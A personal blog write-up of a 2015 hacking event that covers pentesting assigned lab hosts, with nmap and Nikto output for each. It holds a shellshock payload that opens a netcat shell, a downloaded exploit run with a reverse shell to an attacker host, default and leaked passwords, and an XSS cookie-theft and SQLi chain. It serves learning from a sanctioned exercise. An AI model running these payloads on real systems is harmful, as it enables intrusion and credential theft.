<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="keywords" content="ipython, hacking, networking, security, usd, ctf, wargames, events">
        <meta name="description" content="Do you remember this usd AG hacker challenge write-up? This years hacking event organized by the same company took place in Hamburg. 9 hackers all over Germany were invited to pwn&0wn all the things. Every team was assigned a certain IP range that had to be pentested. Every host ...">
        <title>usd AG Hacker Day in Hamburg - blog.dornea.nu</title>
        <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
        <link rel="stylesheet" href="/css/ipython.min.css" type="text/css" />
        <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/bootstrap.min.css" type="text/css" />
        <link rel="stylesheet" href="http://blog.dornea.nu/theme/font-icons/style.min.css" type="text/css" />
        <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/niu2.min.css" type="text/css" />
        <link rel="stylesheet" href="/css/custom.css" type="text/css" />
		
        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/jquery-1.11.0.min.js"></script>
        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/niu2.min.js"></script>
        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/bootstrap.min.js"></script>
        
        <link rel="canonical" href="http://blog.dornea.nu/2015/06/03/usd-ag-hacker-day-in-hamburg" />
        <script type="text/javascript">window.onload=function(){};</script>
        <!--[if lt IE 9]>
            <script src="http://blog.dornea.nu/theme/js/html5shiv.js"></script>
            <script src="http://blog.dornea.nu/theme/js/respond.min.js"></script>
        <![endif]-->
    </head>
    <body> 
        <div id="body-header">
            <div class="navbar navbar-inverse navbar-fixed-top">
                <div class="col-md-12">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <a class="navbar-brand" href="http://blog.dornea.nu">
                            <i class="icon-home"></i>blog.dornea.nu
                        </a>
                    </div>
                    <nav class="collapse navbar-collapse bs-navbar-collapse" role="navigation">
                        <ul class="nav navbar-nav">
                            <li><a href="http://dornea.nu" title="about">
                                <i class="icon-user"></i>about</a>
                            </li>
                            <li><a href="/archives.html" title="archives">
                                <i class="icon-archive"></i>archives</a>
                            </li>
                            <li><a href="/tags.html" title="tags">
                                <i class="icon-tag"></i>tags</a>
                            </li>
                            <li><a href="/feeds/rss.xml" title="feeds">
                                <i class="icon-rss"></i>feeds</a>
                            </li>
                        <!-- category dropdown list -->
                        <li class="dropdown">
                           <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                                <i class="icon-folder-open"></i>category<b class="caret"></b>
                           </a>
                           <ul class="dropdown-menu">
                               <li><a href="http://blog.dornea.nu/category/blog">
                                      <i class="icon-pencil"></i>blog
                                      (117)</a></li>
                               <li><a href="http://blog.dornea.nu/category/low">
                                   <i class="icon-folder-close"></i>LOW
                                      (27)</a></li>
                               <li><a href="http://blog.dornea.nu/category/notes">
                                      <i class="icon-book"></i>notes
                                      (21)</a></li>
                           </ul>
                        </li>
                        <!--  self defined dropdown list -->
                        </ul>
                        
                        <!-- right nav bar -->
                        <ul class="nav navbar-nav navbar-right">
                        <!-- google custom search -->
                        <li>
                        <div id="niu2-cse-wrapper">
                            <div id="niu2-cse-header-box" class="navbar-form navbar-nav">
                                <form action="http://google.com/cse">
                                    <input type="hidden" name="cx" value="008508447409818574933:pxyxuhrgnxi" />
                                    <input type="hidden" name="ie" value="UTF-8" />
                                    <div class="form-group">
                                        <input id="niu2-cse-search-input" class="niu2-cse-header form-control" 
                                            type="text" name="q" 
                                            placeholder="Press enter to search ..."/>
                                    </div>
                                </form>
                           </div>
                           <div id="niu2-cse-ctrl-box" class="navbar-nav">
                            <i id="niu2-cse-search-image" class="icon-search navbar-nav"></i><span id="niu2-cse-search-text">Search</span>
                           </div>
                       </div>
                       </li>
                       </ul>
                    </nav>
                </div>
            </div>
<style>
    #banner{
        background-image:url("http://blog.dornea.nu//images/header.jpg");
    }   
</style>

<div id="banner">
    <div class="container">
        <div class="copy">
            <h2>blog.dornea.nu</h2>
                <p class="intro">Hack, code and drink some țuică. Personal blog of Victor Dorneanu.</p>
        </div>
    </div>
</div>
            <!-- End Banner -->
        </div>

        <div id="body-content">
            <div class="col-md-8 col-md-offset-2">
                <h1 id="content-heading">usd AG Hacker Day in Hamburg</h1>
            </div>
            <div id="niu2-left-container" class="col-md-6 col-md-offset-2 with-right-border">
                <div id="niu2-main-content">
                    <p>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>Do you remember this <a href="http://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions/">usd AG hacker challenge write-up</a>? This years <a href="https://www.usd.de/akademie_/hackertag/">hacking event</a> organized by the same company took place in <strong>Hamburg</strong>. 9 hackers all over Germany were invited to pwn&amp;0wn all the things. Every team was assigned a certain IP range that had to be pentested. Every host identified within the IP range was <strong>rootable</strong>. And that's pretty much the information we had before conducting the pentest. My team got the IP range <strong>10.10.10.20-29</strong>. And now let's have a look at my notes I've taken during the hacking session.</p>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="c9438b851d34cfbecdc47796c0e488d6">Targets<a class="anchor-link" href="#Targets">¶</a></h2>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>First run <code>nmap</code> for assigned IP range (<strong>10.10.10.20-29</strong>):</p>
<pre><code>$ nmap -A -T4 10.10.10.20-29</code></pre>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="8c16bdcafff53f9dd586182348068c1f">10.10.10.20<a class="anchor-link" href="#10.10.10.20">¶</a></h3>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>1) <strong>Nmap</strong> results:</p>
<pre><code>Nmap scan report for 10.10.10.20
Host is up (0.0025s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   1024 0b:2e:f0:93:f8:ad:8f:b7:c4:c2:1c:d2:d1:24:98:dc (DSA)
|   2048 c3:d5:b8:52:a9:3b:a7:79:83:2a:21:4f:81:4f:3f:d9 (RSA)
|_  256 d0:9e:0d:5c:c8:14:46:e5:10:c4:d9:85:12:33:37:0d (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          47289/tcp  status
|_  100024  1          52014/udp  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</code></pre>
<p>2) <strong>Nikto</strong> results:</p>
<pre><code>- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.10.20
+ Target Hostname:    10.10.10.20
+ Target Port:        80
+ Start Time:         2015-06-03 17:36:01 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ Server leaks inodes via ETags, header found with file /, inode: 133083, size: 177, mtime: 0x513d254c3afa1
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3268: /private/: Directory indexing found.
+ OSVDB-3092: /private/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6545 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2015-06-03 17:36:26 (GMT2) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

</code></pre>
<p><br/>
<strong>Observations</strong>:</p>
<hr/>
<ul>
<li>Old version of Apache</li>
<li>Strange ports open: 47289/tcp, 52014/udp</li>
<li><p><a href="http://10.10.10.20/private/info.txt">http://10.10.10.20/private/info.txt</a> contained:</p>
<pre><code>  user@localhost:# 
  user@localhost:# mail 
  user@localhost:# hostname</code></pre>
</li>
</ul>
<p><br/>
<strong>Solutions</strong>:</p>
<hr/>
<ul>
<li>Login to machine per SSH using <strong>user:user</strong></li>
<li>Use a vulnerability in <a href="http://en.wikipedia.org/wiki/Restricted_shell">rbash</a> (restricted bash) in order to run a normal <em>bash</em></li>
<li>Check out <strong>crontab</strong></li>
<li>Modify crontab entry to run commands as <em>root</em></li>
</ul>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="6677766fec2b019c6444cd9a994ddfbe">10.10.10.21<a class="anchor-link" href="#10.10.10.21">¶</a></h3>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>1) <strong>Nmap</strong> results:</p>
<pre><code>Nmap scan report for 10.10.10.21
Host is up (0.0024s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)
| ssh-hostkey: 
|   1024 b8:08:0f:30:c2:68:ad:14:da:f3:aa:4f:ed:81:23:5d (DSA)
|_  2048 c5:99:11:f8:7a:9e:4c:0a:48:30:8b:9d:51:e6:3f:4f (RSA)
80/tcp open  http    Apache httpd 2.2.16 ((Debian))
| http-methods: Potentially risky methods: PUT DELETE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</code></pre>
<p>2) <strong>Nikto</strong> results:</p>
<pre><code>- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.10.21
+ Target Hostname:    10.10.10.21
+ Target Port:        80
+ Start Time:         2015-06-03 14:44:40 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.16 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/319 0x1356645490000 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Apache/2.2.16 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ Cookie JSESSIONID created without the httponly flag
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ OSVDB-68662: /axis2/axis2-web/HappyAxis.jsp: SAP BusinessObjects dswsbobje.war deploys Axis2 with a static admin password. See http://www.rapid7.com/security-center/advisories/R7-0037.jsp
+ /axis2/axis2-web/HappyAxis.jsp: Apache Axis2 was found
+ /manager/html: Default Tomcat Manager interface found
+ 6545 items checked: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2015-06-03 14:45:56 (GMT2) (76 seconds)
---------------------------------------------------------------------------

</code></pre>
<p><br/>
<strong>Observations</strong>:</p>
<hr/>
<ul>
<li>Old version of SSH server</li>
<li>Old version of Apache server running Apache Tomcat</li>
<li>HTTP methods PUT and DELETE are available</li>
<li>The sever is hosting an Axis2 instance</li>
</ul>
<p><br/>
<strong>Solutions</strong>:</p>
<hr/>
<ul>
<li>Login to Axis2 admin area using <strong>admin:axis2</strong> (default password)</li>
<li>Upload a vulnerable service to Axis2 using <strong>metasploit</strong> (exploit/multi/http/axis2_deployer)</li>
<li>Fire a new <strong>shell</strong> (as user <strong>tomcat</strong>) </li>
<li>Have a look at <strong>/etc/passwd</strong> and notice that <strong>user</strong> is a "Debian Live User"</li>
<li>Google for Debians live user default password (=live)</li>
<li>Login using <strong>user:live</strong></li>
<li>sudo su --&gt; root</li>
</ul>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="09e94d20319bbe99a7841cb5e87a2c11">10.10.10.22<a class="anchor-link" href="#10.10.10.22">¶</a></h3>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>1) <strong>Nmap</strong> results:</p>
<pre><code>Nmap scan report for 10.10.10.22
Host is up (0.0023s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 03:d3:10:1a:5e:9b:f8:32:25:e9:af:e1:3f:5b:61:45 (DSA)
|_  2048 a2:4d:a5:aa:2a:e4:50:3d:03:cf:f6:5d:d7:e1:75:26 (RSA)
80/tcp   open  http    Apache httpd 2.2.3 ((CentOS))
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            873/udp  status
|_  100024  1            876/tcp  status
3306/tcp open  mysql   MySQL (unauthorized)

</code></pre>
<p>2) <strong>Nikto</strong> results:</p>
<pre><code>- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.10.22
+ Target Hostname:    10.10.10.22
+ Target Port:        80
+ Start Time:         2015-06-03 14:53:14 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.3 (CentOS)
+ Server leaks inodes via ETags, header found with file /, inode: 1360390, size: 65, mtime: 0x5068ebf68ea80
+ The anti-clickjacking X-Frame-Options header is not present.
+ Apache/2.2.3 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6545 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2015-06-03 14:54:40 (GMT2) (86 seconds)
---------------------------------------------------------------------------

</code></pre>
<p><br/>
<strong>Observations</strong>:</p>
<hr/>
<ul>
<li>Old version of SSH server</li>
<li>Old version of Apache server running</li>
<li>MySQL server is exposed to 0.0.0.0</li>
</ul>
<p><br/>
<strong>Solutions</strong>:</p>
<hr/>
<ul>
<li><p>Looking at the web application we've found this:</p>
<pre><code>  $ curl -v "http://10.10.10.22/cgi-bin/hello.sh?hacker"
  *   Trying 10.10.10.22...
  * Connected to 10.10.10.22 (10.10.10.22) port 80 (#0)
  &gt; GET /cgi-bin/hello.sh?hacker HTTP/1.1
  &gt; Host: 10.10.10.22
  &gt; User-Agent: curl/7.42.1
  &gt; Accept: */*
  &gt; 
  &lt; HTTP/1.1 200 OK
  &lt; Date: Wed, 03 Jun 2015 15:56:24 GMT
  &lt; Server: Apache/2.2.3 (CentOS)
  &lt; Content-Length: 13
  &lt; Connection: close
  &lt; Content-Type: text/plain; charset=UTF-8
  &lt; 
  hello hacker
  * Closing connection 0</code></pre>
</li>
<li><p>Modifying the parameters lead to:</p>
<pre><code>  $ curl -v "http://10.10.10.22/cgi-bin/hello.sh?hacker;asdk;ping alkjsd"
  *   Trying 10.10.10.22...
  * Connected to 10.10.10.22 (10.10.10.22) port 80 (#0)
  &gt; GET /cgi-bin/hello.sh?hacker;asdk;ping alkjsd HTTP/1.1
  &gt; Host: 10.10.10.22
  &gt; User-Agent: curl/7.42.1
  &gt; Accept: */*
  &gt; 
  &lt; HTTP/1.1 200 OK
  &lt; Date: Wed, 03 Jun 2015 15:56:33 GMT
  &lt; Server: Apache/2.2.3 (CentOS)
  &lt; Content-Length: 25
  &lt; Connection: close
  &lt; Content-Type: text/plain; charset=UTF-8
  &lt; 
  hello hacker\;asdk\;ping
  * Closing connection 0</code></pre>
</li>
<li><p>Apache, cgi-bin, hello.sh ... That looked like a potential <strong>shellshock</strong> attack:</p>
<pre><code>  $ curl -v -H "$(cat request)" "http://10.10.10.22/cgi-bin/hello.sh?hacker"
  *   Trying 10.10.10.22...
  * Connected to 10.10.10.22 (10.10.10.22) port 80 (#0)
  &gt; GET /cgi-bin/hello.sh?hacker HTTP/1.1
  &gt; Host: 10.10.10.22
  &gt; Accept: */*
  &gt; User-Agent: () { :;}; /bin/bash -c 'nc -l -p 4445 -e /bin/bash &amp;'
  &gt; 
  &lt; HTTP/1.1 500 Internal Server Error
  &lt; Date: Wed, 03 Jun 2015 15:57:10 GMT
  &lt; Server: Apache/2.2.3 (CentOS)
  &lt; Content-Length: 610
  &lt; Connection: close
  &lt; Content-Type: text/html; charset=iso-8859-1
  &lt; 
  &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
  &lt;html&gt;&lt;head&gt;
  &lt;title&gt;500 Internal Server Error&lt;/title&gt;
  &lt;/head&gt;&lt;body&gt;
  &lt;h1&gt;Internal Server Error&lt;/h1&gt;
  &lt;p&gt;The server encountered an internal error or
  misconfiguration and was unable to complete
  your request.&lt;/p&gt;
  &lt;p&gt;Please contact the server administrator,
   root@localhost and inform them of the time the error occurred,
  and anything you might have done that may have
  caused the error.&lt;/p&gt;
  &lt;p&gt;More information about this error may be available
  in the server error log.&lt;/p&gt;
  &lt;hr&gt;
  &lt;address&gt;Apache/2.2.3 (CentOS) Server at 10.10.10.22 Port 80&lt;/address&gt;
  &lt;/body&gt;&lt;/html&gt;
  * Closing connection 0</code></pre>
<p>In the above curl output you can see that the <strong>User-Agent</strong> contains the payload:</p>
<pre><code>  * run **netcat** and listen on port **4445**
  * when connecting to this port a new **bash** instance should be spawned</code></pre>
</li>
<li><p>Unfortunately the manual way didn't work so we've found this <a href="https://www.exploit-db.com/exploits/34900/">Apache mod_cgi - ShellshockRemote Exploit</a>:</p>
<pre><code>  $ wget https://www.exploit-db.com/download/34900 -o shellshock.py
$ python2 shellshock.py payload=reverse rhost=10.10.10.22 \
      lhost=10.10.10.95 lport=4447 pages=http://10.10.10.22/cgi-bin/hello.sh
  ...</code></pre>
<p>That will give you a reverse shell on port 4447.</p>
</li>
<li><p>Havin the shell access to the machine we've stared investigating the permissions on the file system. We've found out that current user (www-data I think) was able to read files inside <strong>/root</strong>.</p>
<pre><code>  10.10.10.22&gt; ls -l
      total 36
      -rw-r--r-- 1 root root 20396 May 18  2014 install.log
      -rw-r--r-- 1 root root  3148 May 18  2014 install.log.syslog
      -rw-r--r-- 1 root root    13 Feb 25 07:56 password-for-vpn.txt

  10.10.10.22&gt; cat password-for-vpn.txt
  VeRySeCuRe_7</code></pre>
</li>
<li>Loging in as <strong>user:VeRySeCuRe_7</strong> per SSH was then successful</li>
</ul>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="36189aa21426649f3415a28d22293918">10.10.10.23<a class="anchor-link" href="#10.10.10.23">¶</a></h3>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>1) <strong>Nmap</strong> results:</p>
<pre><code>Nmap scan report for 10.10.10.23
Host is up (0.0025s latency).
Not shown: 986 closed ports
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          SLmail smtpd 5.5.0.4433
| smtp-commands: mailer, SIZE 100000000, SEND, SOML, SAML, HELP, VRFY, EXPN, ETRN, XTRN, 
|_ This server supports the following commands. HELO MAIL RCPT DATA RSET SEND SOML SAML HELP NOOP QUIT 
79/tcp    open  finger        SLMail fingerd
|_finger: Finger online user list request denied.
106/tcp   open  pop3pw        SLMail pop3pw
110/tcp   open  pop3          BVRP Software SLMAIL pop3d
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
445/tcp   open  netbios-ssn
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailer; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: mailer
|   NetBIOS computer name: MAILER
|   Workgroup: WORKGROUP
|_  System time: 2015-06-03T14:35:31+02:00
| smb-security-mode: 
|   Account that was used for smb scripts: &lt;blank&gt;
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|_  Message signing disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

</code></pre>
<p><br/>
<strong>Observations</strong>:</p>
<hr/>
<ul>
<li>It's a Windows box :D</li>
<li>A <strong>lot</strong> of services are exposed</li>
<li>There is a <strong>smtpd</strong> running on port 25 (that might be interesting)</li>
</ul>
<p><br/>
<strong>Solution</strong>:</p>
<hr/>
<ul>
<li>Search in <strong>metasploit</strong> for <em>SLmail smtpd 5.5.0.4433</em></li>
<li>Use found exploit to gain access to the machine</li>
<li>And voila you're logged in as admin</li>
</ul>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="472916cd17fa81ca6ce710eb9a8e7a3d">10.10.10.24<a class="anchor-link" href="#10.10.10.24">¶</a></h3>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>1) <strong>Nmap</strong> results:</p>
<pre><code>Nmap scan report for 10.10.10.24
Host is up (0.0026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze4 (protocol 2.0)
| ssh-hostkey: 
|   1024 5e:c5:45:45:52:12:47:04:1d:cc:b5:28:ca:91:5d:6c (DSA)
|_  2048 e3:29:e3:18:43:20:3d:c7:be:a9:7f:13:62:99:06:10 (RSA)
80/tcp open  http    Apache httpd 2.2.16 ((Debian))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: PentesterLab vulnerable blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds

</code></pre>
<p>2) <strong>Nikto</strong> results:</p>
<pre><code>- Nikto v2.1.5
 ---------------------------------------------------------------------------
 + Target IP:          10.10.10.24
 + Target Hostname:    10.10.10.24
 + Target Port:        80
 + Start Time:         2015-06-03 15:00:49 (GMT2)
 ---------------------------------------------------------------------------
 + Server: Apache/2.2.16 (Debian)
 + Retrieved x-powered-by header: PHP/5.3.3-7+squeeze18
 + The anti-clickjacking X-Frame-Options header is not present.
 + OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.0.1/images/".
 + Apache/2.2.16 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
 + Server leaks inodes via ETags, header found with file /favicon.ico, inode: 6756, size: 14634, mtime: 0x4e1d6b3f0db40
 + DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
 + Cookie PHPSESSID created without the httponly flag
 + OSVDB-5034: /admin/login.php?action=insert&amp;username=test&amp;password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 't
 est' password 'test' to verify.
 + OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
 + OSVDB-3268: /icons/: Directory indexing found.
 + OSVDB-3268: /images/: Directory indexing found.
 + OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.
 + OSVDB-3233: /icons/README: Apache default file found.
 + /admin/login.php: Admin login page/section found.
 + 6545 items checked: 0 error(s) and 14 item(s) reported on remote host
 + End Time:           2015-06-03 15:01:58 (GMT2) (69 seconds)

</code></pre>
<p><br/>
<strong>Observations</strong>:</p>
<hr/>
<ul>
<li>It's a <strong>blog</strong> system</li>
<li>Authentification is done via session id (<code>=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</code>)</li>
<li>There is an <strong>admin area</strong> (/admin/login.php)</li>
</ul>
<p><br/>
<strong>Solution</strong>:</p>
<hr/>
<ul>
<li>Inside the comments section you can store a <strong>persistent XSS</strong></li>
<li>There is a cronjob which "visits" the site logged in as <strong>admin</strong></li>
<li><p>The main idea was to <strong>steal</strong> admins <strong>sesssion</strong> using the XSS:</p>
<ul>
<li>Create XSS payload and send <code>document.cookie</code> to a box listening on a certain port</li>
<li>Using <code>netcat</code> you had to listen for the incomming request which exposed admins session</li>
<li>Once you have stolen the session you could use it to access the admin area</li>
</ul>
</li>
<li><p>Inside the admin area there was a <strong>SQLi</strong> which you could use to <strong>read files</strong> from filesystem</p>
</li>
<li>Having read <code>/etc/passwd</code> you were to see which users were available on the box</li>
<li>Log in as <strong>user:live</strong>  to the machine (per SSH)</li>
<li>? (I can't remember the last step(s) xD)</li>
</ul>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="6988aab4de844bedbe7984c3e74c1cc2">Conclusion<a class="anchor-link" href="#Conclusion">¶</a></h2>
</div>
</div>
</div>
<div class="cell border-box-sizing text_cell rendered">
<div class="prompt input_prompt">
</div>
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<p>I'd like to thank <a href="https://www.usd.de/">usd AG</a> for the organizational part and all participants for having a great time in Hamburg City.</p>
<p><img class="img-responsive" src="http://dl.dornea.nu/img/2015/hackertag/4f41c02eeeb8fbee62da2751ffd913bc.jpg" width="99%"/></p>
</div>
</div>
</div></p>
                </div>
<hr/>
<div style="float:left;">
	Prev: <a href="http://blog.dornea.nu/2015/05/24/validating-and-pinning-x509-certificates" align='left'>
	 Validating and pinning X.509 certificates
	</a>
</div>
<div style="float:right;">
    Next: <a href="http://blog.dornea.nu/2015/07/01/debugging-android-native-shared-libraries" align='right'>
	 Debugging Android native shared libraries
	</a>
</div>
</p>

                <!-- Add comments -->
<div id="content-comments">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname="dorneanu";
				var disqus_identifier = 'usd-ag-hacker-day-in-hamburg';
			var disqus_url = 'http://blog.dornea.nu/2015/06/03/usd-ag-hacker-day-in-hamburg';

		var disqus_config = function () {
			this.language = "en";
		};
 
        
        (function(){var a=document.createElement("script");a.type="text/javascript";a.async=true;a.src="//"+disqus_shortname+".disqus.com/embed.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(a)})();</script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div> 
            </div>
            <div class="niu2-right-container col-md-2">
                <div id="niu2-sidebar-meta" class="niu2-sidebar">
                    <div class="niu2-sidebar-label"><i class="icon-calendar"></i>Published:</div>
                    <div class="niu2-sidebar-value">2015-06-03 00:00</div>
                    <div class="niu2-sidebar-label"><i class="icon-pencil"></i>category:</div>
                    <div class="niu2-sidebar-value"><a href="http://blog.dornea.nu/category/blog">blog</a></div>
                    <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ipython/">ipython</a><sup>16</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/hacking/">hacking</a><sup>22</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/networking/">networking</a><sup>40</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/security/">security</a><sup>35</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/usd/">usd</a><sup>2</sup></div>
